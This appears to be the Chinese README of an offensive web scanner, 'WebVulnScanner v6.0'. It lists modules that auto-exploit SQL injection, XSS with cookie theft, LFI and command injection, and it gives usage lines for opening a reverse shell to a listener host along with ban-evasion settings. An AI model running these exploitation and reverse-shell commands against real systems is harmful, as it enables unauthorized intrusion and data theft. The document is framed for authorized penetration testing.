# WebVulnScanner v6.0

> **全功能 Web 漏洞扫描与自动利用框架**
> Author: 火柴 | GitHub: [huocai250](https://github.com/huocai250)
> ⚠️ **仅供已获书面授权的渗透测试使用！**

---

## 新特性（v6.0）

| 新增 | 说明 |
|------|------|
| 🕷️ 爬虫 | 自动爬取页面，发现参数和表单 |
| 🎯 CMS专项 | WordPress/Joomla/ThinkPHP/Shiro/Actuator |
| ⚡ SQLi利用 | 自动dump数据库版本/用户/库名/表名/列名 |
| ⚡ 命令注入利用 | 自动收集系统信息，支持反弹Shell |
| ⚡ XSS利用 | 生成PoC URL + Cookie窃取payload |
| ⚡ LFI利用 | 自动读取敏感文件，PHP wrapper源码读取 |
| 📊 CSV报告 | 兼容Excel的CSV格式输出 |
| 🔧 配置文件 | scanner.cfg 管理所有参数 |
| 🚦 速率限制 | 令牌桶算法防封IP |
| 📦 批量扫描 | -f targets.txt 批量扫描 |
| 📝 统一日志 | logging模块，支持文件输出 |

---

## 安装

```bash
pip install -r requirements.txt
```

---

## 快速使用

```bash
# 基础扫描
python main.py https://example.com

# 开启漏洞自动利用
python main.py https://example.com --exploit

# 只利用 SQL注入 和 命令注入
python main.py https://example.com --exploit --exploit-types sqli,cmdi

# 命令注入时反弹Shell（先开监听：nc -lvnp 4444）
python main.py https://example.com --exploit --exploit-types cmdi \
  --reverse-host 192.168.1.100 --reverse-port 4444

# 批量扫描 + CSV报告
python main.py -f targets.txt --output-csv results.csv

# 使用代理 + 速率限制（防封IP）
python main.py https://example.com --proxy http://127.0.0.1:8080 --rate-limit 0.5

# 快速模式（仅核心检测）
python main.py https://example.com --fast

# 只运行指定模块
python main.py https://example.com --only sqli,xss,cms

# 静默模式 + 日志文件
python main.py https://example.com -q --log-file scan.log

# 靶场测试（推荐）
docker run -d -p 80:80 vulnerables/web-dvwa
python main.py http://localhost --exploit
```

---

## 模块列表（25个）

| # | 模块 | 说明 | 利用 |
|---|------|------|------|
| 1  | 爬虫 | 发现参数URL和表单 | - |
| 2  | 信息收集 | Server/技术栈/WAF/DNS | - |
| 3  | CMS专项 | WP/Joomla/TP/Shiro/Actuator | - |
| 4  | HTTP安全头 | HSTS/CSP/Cookie等9项 | - |
| 5  | SSL/TLS | 证书/协议/密码套件 | - |
| 6  | 敏感信息 | 密钥/密码/.env/.git等 | - |
| 7  | CORS | 反射Origin/Credentials | - |
| 8  | CSRF | 表单Token检测 | - |
| 9  | Clickjacking | iframe保护/目录列表 | - |
| 10 | HTTP方法 | TRACE/PUT/DELETE | - |
| 11 | 开放重定向 | 多种绕过Payload | - |
| 12 | JWT安全 | None算法/弱密钥爆破 | - |
| 13 | 注入检测 | Log4Shell/CRLF/Host Header | - |
| 14 | API安全 | 未授权/GraphQL/IDOR | - |
| 15 | **SQL注入** | 报错/布尔/时延盲注 | ✅ dump数据库 |
| 16 | **XSS** | 反射型/存储型/SSTI | ✅ PoC+Cookie窃取 |
| 17 | **LFI/命令注入** | 文件包含/RCE | ✅ 读文件/反弹Shell |
| 18 | 路径穿越 | 40+绕过Payload | - |
| 19 | XXE | XML外部实体注入 | - |
| 20 | SSRF | 内网探测/云元数据 | - |
| 21 | 文件上传 | 扩展名绕过检测 | - |
| 22 | 弱口令 | 常见默认凭据 | - |
| 23 | 子域名枚举 | 80+字典 | - |
| 24 | 端口扫描 | 30+高危端口 | - |
| 25 | 目录枚举 | 80+路径+软404过滤 | - |

---

## 配置文件（scanner.cfg）

```ini
[network]
threads = 10
timeout = 10
rate_limit = 0.5    # 防封IP
max_retries = 2

[exploit]
exploit = true
exploit_types = sqli,cmdi,xss,lfi
reverse_host = 192.168.1.100
reverse_port = 4444

[output]
log_level = INFO
log_file = scan.log
```

---

## 法律声明

本工具仅供安全研究人员在**已获得书面授权**的情况下使用。
未经授权扫描他人系统可能违反法律法规，作者不承担任何法律责任。

**Author: 火柴 | GitHub: https://github.com/huocai250**
